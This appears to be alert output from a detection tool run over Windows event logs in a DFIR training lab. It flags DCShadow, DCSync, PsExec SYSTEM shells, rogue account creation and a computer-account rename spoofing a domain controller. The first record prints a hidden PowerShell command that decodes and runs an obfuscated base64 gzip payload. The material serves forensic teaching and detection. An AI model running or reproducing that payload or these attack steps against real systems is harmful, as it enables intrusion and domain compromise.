+2021-04-22T08:51:05.633349+00:00,Base64 Encoded PowerShell Command Detected;Gzip Archive Decode Via PowerShell;Suspicious FromBase64String Usage On Gzip Archive - Process Creation,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\02.evtx,1,Microsoft-Windows-Security-Auditing,4688,435124,fs03vuln.offsec.lan,"SubjectDomainName: OFFSEC
+TokenElevationType: '%%1936'
+SubjectUserSid: S-1-5-18
+ProcessId: '0x7f0'
+NewProcessId: '0x8f0'
+CommandLine: '""C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe"" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'
+SubjectLogonId: '0x3e7'
+SubjectUserName: FS03VULN$
+NewProcessName: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+"
+2021-04-27T11:04:03.495868+00:00,Possible DC Shadow Attack,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\08.evtx,1,Microsoft-Windows-Security-Auditing,4742,138520214,rootdc1.offsec.lan,"PrivilegeList: '-'
+NewUacValue: '-'
+LogonHours: '-'
+ScriptPath: '-'
+DnsHostName: '-'
+ProfilePath: '-'
+AllowedToDelegateTo: '-'
+HomePath: '-'
+ComputerAccountChange: '-'
+DisplayName: '-'
+PrimaryGroupId: '-'
+HomeDirectory: '-'
+TargetUserName: JUMP01$
+TargetSid: S-1-5-21-4230534742-2542757381-3142984815-1106
+SidHistory: '-'
+SubjectUserName: admmig
+UserPrincipalName: '-'
+TargetDomainName: OFFSEC
+ServicePrincipalNames: ""\r\n\t\tHOST/jump01.offsec.lan\r\n\t\tRestrictedKrbHost/jump01.offsec.lan\r\n\t\tHOST/JUMP01\r\n\t\tRestrictedKrbHost/JUMP01\r\n\t\tWSMAN/jump01.offsec.lan\r\n\t\tWSMAN/jump01\r\n\t\tTERMSRV/jump01.offsec.lan\r\n\t\tTERMSRV/JUMP01\r\n\t\tE3514235-4B06-11D1-AB04-00C04FC2DCD2/097b2e16-f2c3-44ef-b300-ec7e11e2a9f2/offsec.lan\r\n\t\tE3514235-4B06-11D1-AB04-00C04FC2DCD2/1c0d8021-150e-4ad0-9d64-93a88c51795b/offsec.lan\r\n\t\tGC/jump01.offsec.lan/offsec.lan""
+PasswordLastSet: '-'
+UserParameters: '-'
+SubjectLogonId: '0x31a24611'
+SubjectDomainName: OFFSEC
+AccountExpires: '-'
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111
+OldUacValue: '-'
+SamAccountName: '-'
+UserAccountControl: '-'
+UserWorkstations: '-'
+"
+2021-04-27T11:04:03.497635+00:00,Active Directory Replication from Non Machine Account - DcSync Indicator,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\08.evtx,1,Microsoft-Windows-Security-Auditing,4662,138520216,rootdc1.offsec.lan,"ObjectType: '%{19195a5b-6da0-11d0-afd3-00c04fd930c9}'
+AdditionalInfo: '-'
+ObjectName: '%{0b32719a-29a5-4ad5-b9dc-56200eba0ce0}'
+SubjectDomainName: OFFSEC
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111
+OperationType: Object Access
+HandleId: '0x0'
+AccessMask: '0x100'
+Properties: ""%%7688\r\n\t\t{9923a32a-3607-11d2-b9be-0000f87a36b2}\r\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}\r\n""
+SubjectLogonId: '0x31a19b0f'
+SubjectUserName: admmig
+ObjectServer: DS
+AdditionalInfo2: ''
+AccessList: ""%%7688\r\n\t\t\t\t""
+"
+2021-04-27T11:04:03.502421+00:00,Possible DC Shadow Attack,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\08.evtx,1,Microsoft-Windows-Security-Auditing,4742,138520217,rootdc1.offsec.lan,"PrivilegeList: '-'
+NewUacValue: '-'
+LogonHours: '-'
+ScriptPath: '-'
+DnsHostName: '-'
+ProfilePath: '-'
+AllowedToDelegateTo: '-'
+HomePath: '-'
+ComputerAccountChange: '-'
+DisplayName: '-'
+PrimaryGroupId: '-'
+HomeDirectory: '-'
+TargetUserName: JUMP01$
+TargetSid: S-1-5-21-4230534742-2542757381-3142984815-1106
+SidHistory: '-'
+SubjectUserName: admmig
+UserPrincipalName: '-'
+TargetDomainName: OFFSEC
+ServicePrincipalNames: ""\r\n\t\tHOST/jump01.offsec.lan\r\n\t\tRestrictedKrbHost/jump01.offsec.lan\r\n\t\tHOST/JUMP01\r\n\t\tRestrictedKrbHost/JUMP01\r\n\t\tWSMAN/jump01.offsec.lan\r\n\t\tWSMAN/jump01\r\n\t\tTERMSRV/jump01.offsec.lan\r\n\t\tTERMSRV/JUMP01\r\n\t\tE3514235-4B06-11D1-AB04-00C04FC2DCD2/097b2e16-f2c3-44ef-b300-ec7e11e2a9f2/offsec.lan\r\n\t\tE3514235-4B06-11D1-AB04-00C04FC2DCD2/1c0d8021-150e-4ad0-9d64-93a88c51795b/offsec.lan\r\n\t\tGC/jump01.offsec.lan/offsec.lan\r\n\t\tE3514235-4B06-11D1-AB04-00C04FC2DCD2/7a671d6e-2719-481c-9c85-ae67c137cc0d/offsec.lan""
+PasswordLastSet: '-'
+UserParameters: '-'
+SubjectLogonId: '0x31a19b0f'
+SubjectDomainName: OFFSEC
+AccountExpires: '-'
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111
+OldUacValue: '-'
+SamAccountName: '-'
+UserAccountControl: '-'
+UserWorkstations: '-'
+"
+2021-04-27T11:04:13.291388+00:00,Possible DC Shadow Attack,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\08.evtx,1,Microsoft-Windows-Security-Auditing,5136,138520224,rootdc1.offsec.lan,"OpCorrelationID: C41EADE4-162A-4D70-8488-F92F6AF8FF49
+AppCorrelationID: '-'
+AttributeSyntaxOID: 2.5.5.12
+ObjectDN: CN=JUMP01,OU=SERVERS,OU=RESOURCES,DC=offsec,DC=lan
+SubjectLogonId: '0x31a24611'
+DSType: '%%14676'
+ObjectGUID: EAC0F94E-A686-463D-801C-91A1B85FE87D
+AttributeLDAPDisplayName: servicePrincipalName
+SubjectDomainName: OFFSEC
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111
+ObjectClass: computer
+DSName: offsec.lan
+AttributeValue: GC/jump01.offsec.lan/offsec.lan
+OperationType: '%%14674'
+SubjectUserName: admmig
+"
+2021-04-27T11:04:53.341229+00:00,Possible DC Shadow Attack,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\08.evtx,1,Microsoft-Windows-Security-Auditing,5136,138520257,rootdc1.offsec.lan,"OpCorrelationID: 44BD5E53-E046-403A-9C1A-FA5D10C6CC74
+AppCorrelationID: '-'
+AttributeSyntaxOID: 2.5.5.12
+ObjectDN: CN=JUMP01,OU=SERVERS,OU=RESOURCES,DC=offsec,DC=lan
+SubjectLogonId: '0x31a24611'
+DSType: '%%14676'
+ObjectGUID: EAC0F94E-A686-463D-801C-91A1B85FE87D
+AttributeLDAPDisplayName: servicePrincipalName
+SubjectDomainName: OFFSEC
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111
+ObjectClass: computer
+DSName: offsec.lan
+AttributeValue: GC/jump01.offsec.lan/offsec.lan
+OperationType: '%%14675'
+SubjectUserName: admmig
+"
+2021-06-01T14:06:34.542413+00:00,Local User Creation,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\07.evtx,1,Microsoft-Windows-Security-Auditing,4720,1945920,fs01.offsec.lan,"UserWorkstations: '%%1793'
+PrivilegeList: '-'
+OldUacValue: '0x0'
+NewUacValue: '0x15'
+UserPrincipalName: '-'
+TargetDomainName: FS01
+LogonHours: '%%1797'
+ScriptPath: '%%1793'
+PasswordLastSet: '%%1794'
+UserParameters: '%%1793'
+SubjectLogonId: '0x46b7b4'
+ProfilePath: '%%1793'
+AllowedToDelegateTo: '-'
+SubjectDomainName: OFFSEC
+HomePath: '%%1793'
+AccountExpires: '%%1794'
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111
+DisplayName: '%%1793'
+HomeDirectory: '%%1793'
+TargetUserName: WADGUtilityAccount
+UserAccountControl: ""\r\n\t\t%%2080\r\n\t\t%%2082\r\n\t\t%%2084""
+SidHistory: '-'
+TargetSid: S-1-5-21-1081258321-37805170-3511562335-1000
+SamAccountName: WADGUtilityAccount
+SubjectUserName: admmig
+PrimaryGroupId: '513'
+"
+2021-06-01T14:08:21.225567+00:00,Local User Creation,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\07.evtx,1,Microsoft-Windows-Security-Auditing,4720,1945943,fs01.offsec.lan,"UserWorkstations: '%%1793'
+PrivilegeList: '-'
+OldUacValue: '0x0'
+NewUacValue: '0x15'
+UserPrincipalName: '-'
+TargetDomainName: FS01
+LogonHours: '%%1797'
+ScriptPath: '%%1793'
+PasswordLastSet: '%%1794'
+UserParameters: '%%1793'
+SubjectLogonId: '0x46b7b4'
+ProfilePath: '%%1793'
+AllowedToDelegateTo: '-'
+SubjectDomainName: OFFSEC
+HomePath: '%%1793'
+AccountExpires: '%%1794'
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1111
+DisplayName: '%%1793'
+HomeDirectory: '%%1793'
+TargetUserName: elie
+UserAccountControl: ""\r\n\t\t%%2080\r\n\t\t%%2082\r\n\t\t%%2084""
+SidHistory: '-'
+TargetSid: S-1-5-21-1081258321-37805170-3511562335-1001
+SamAccountName: elie
+SubjectUserName: admmig
+PrimaryGroupId: '513'
+"
+2021-12-04T21:19:16.741995+00:00,Psexec Execution,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\01.evtx,1,Microsoft-Windows-Sysmon,1,48593,fs03vuln.offsec.lan,"Image: C:\TOOLS\PsExec64.exe
+RuleName: technique_id=T1035,technique_name=Service Execution
+Description: Execute processes remotely
+OriginalFileName: psexec.c
+TerminalSessionId: 2
+ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
+Product: Sysinternals PsExec
+Company: Sysinternals - www.sysinternals.com
+ParentProcessId: 532
+LogonGuid: A57649D1-9E9D-61A6-56EF-830000000000
+Hashes: SHA1=FB0A150601470195C47B4E8D87FCB3F50292BEB2,MD5=9321C107D1F7E336CDA550A2BF049108,SHA256=AD6B98C01EE849874E4B4502C3D7853196F6044240D3271E4AB3FC6E3C08E9A4,IMPHASH=159D56D406180A332FBC99290F30700E
+ParentProcessGuid: A57649D1-ACE8-61A6-885B-920000000000
+ProcessId: 2124
+CurrentDirectory: C:\TOOLS\
+ProcessGuid: A57649D1-DB54-61AB-775C-DC0100000000
+CommandLine: PsExec64.exe  -i -s cmd
+FileVersion: '2.2'
+User: OFFSEC\admmig
+LogonId: '0x83ef56'
+IntegrityLevel: High
+ParentImage: C:\Windows\System32\cmd.exe
+UtcTime: 2021-12-04 21:19:16.741
+"
+2021-12-04T21:19:16.757608+00:00,PsExec Service File Creation,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\01.evtx,1,Microsoft-Windows-Sysmon,11,48595,fs03vuln.offsec.lan,"ProcessGuid: A57649D1-DB54-61AB-775C-DC0100000000
+CreationUtcTime: 2021-12-04 21:17:29.604
+UtcTime: 2021-12-04 21:19:16.757
+ProcessId: 2124
+RuleName: '-'
+TargetFilename: C:\Windows\PSEXESVC.exe
+Image: C:\TOOLS\PsExec64.exe
+"
+2021-12-04T21:19:16.757608+00:00,PUA - Sysinternal Tool Execution - Registry;PUA - Sysinternals Tools Execution - Registry,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\01.evtx,1,Microsoft-Windows-Sysmon,13,48594,fs03vuln.offsec.lan,"Image: C:\TOOLS\PsExec64.exe
+TargetObject: HKU\S-1-5-21-4230534742-2542757381-3142984815-1111\Software\Sysinternals\PsExec\EulaAccepted
+RuleName: technique_id=T1035,technique_name=Service Execution
+EventType: SetValue
+ProcessId: 2124
+ProcessGuid: A57649D1-DB54-61AB-775C-DC0100000000
+UtcTime: 2021-12-04 21:19:16.757
+Details: DWORD (0x00000001)
+"
+2021-12-04T21:19:16.929497+00:00,Elevated System Shell Spawned From Uncommon Parent Location;PsExec Service Child Process Execution as LOCAL SYSTEM,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\01.evtx,1,Microsoft-Windows-Sysmon,1,48606,fs03vuln.offsec.lan,"Image: C:\Windows\System32\cmd.exe
+RuleName: technique_id=T1059,technique_name=Command-Line Interface
+Description: Windows Command Processor
+OriginalFileName: Cmd.Exe
+TerminalSessionId: 2
+ParentCommandLine: C:\Windows\PSEXESVC.exe
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+ParentProcessId: 4752
+LogonGuid: A57649D1-92D9-61A4-E703-000000000000
+Hashes: SHA1=7C3D7281E1151FE4127923F4B4C3CD36438E1A12,MD5=F5AE03DE0AD60F5B17B82F2CD68402FE,SHA256=6F88FB88FFB0F1D5465C2826E5B4F523598B1B8378377C8378FFEBC171BAD18B,IMPHASH=77AED1ADAF24B344F08C8AD1432908C3
+ParentProcessGuid: A57649D1-DB54-61AB-2B62-DC0100000000
+ProcessId: 540
+CurrentDirectory: C:\Windows\system32\
+ProcessGuid: A57649D1-DB54-61AB-0467-DC0100000000
+CommandLine: '""cmd"" '
+FileVersion: 6.3.9600.17415 (winblue_r4.141028-1500)
+User: NT AUTHORITY\SYSTEM
+LogonId: '0x3e7'
+IntegrityLevel: System
+ParentImage: C:\Windows\PSEXESVC.exe
+UtcTime: 2021-12-04 21:19:16.929
+"
+2021-12-14T14:42:48.817933+00:00,Add or Remove Computer from DC,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\09.evtx,1,Microsoft-Windows-Security-Auditing,4741,237294524,rootdc1.offsec.lan,"UserWorkstations: '%%1793'
+PrivilegeList: SeMachineAccountPrivilege
+OldUacValue: '0x0'
+NewUacValue: '0x84'
+UserPrincipalName: '-'
+TargetDomainName: OFFSEC
+LogonHours: '%%1793'
+ServicePrincipalNames: '-'
+ScriptPath: '%%1793'
+PasswordLastSet: '%%1794'
+UserParameters: '%%1792'
+SubjectLogonId: '0x308fb82ad'
+ProfilePath: '%%1793'
+DnsHostName: '-'
+AllowedToDelegateTo: '-'
+SubjectDomainName: OFFSEC
+HomePath: '%%1793'
+AccountExpires: '%%1794'
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1234
+DisplayName: '%%1793'
+HomeDirectory: '%%1793'
+TargetUserName: compnay-88$
+UserAccountControl: ""\r\n\t\t%%2082\r\n\t\t%%2087""
+SidHistory: '-'
+TargetSid: S-1-5-21-4230534742-2542757381-3142984815-1296
+SamAccountName: compnay-88$
+SubjectUserName: hack1
+PrimaryGroupId: '515'
+"
+2021-12-14T14:42:49.235014+00:00,New or Renamed User Account with '$' Character,C:\STUDY\Github\CADRE-Platform\DFIR-Nexus\Evidence-files\_tiny\T12\evtx\09.evtx,1,Microsoft-Windows-Security-Auditing,4781,237294536,rootdc1.offsec.lan,"PrivilegeList: '-'
+NewTargetUserName: compnay-88$
+SubjectDomainName: OFFSEC
+OldTargetUserName: rootdc1
+TargetDomainName: OFFSEC
+SubjectUserSid: S-1-5-21-4230534742-2542757381-3142984815-1234
+TargetSid: S-1-5-21-4230534742-2542757381-3142984815-1296
+SubjectLogonId: '0x308fabb0c'
+SubjectUserName: hack1
+"
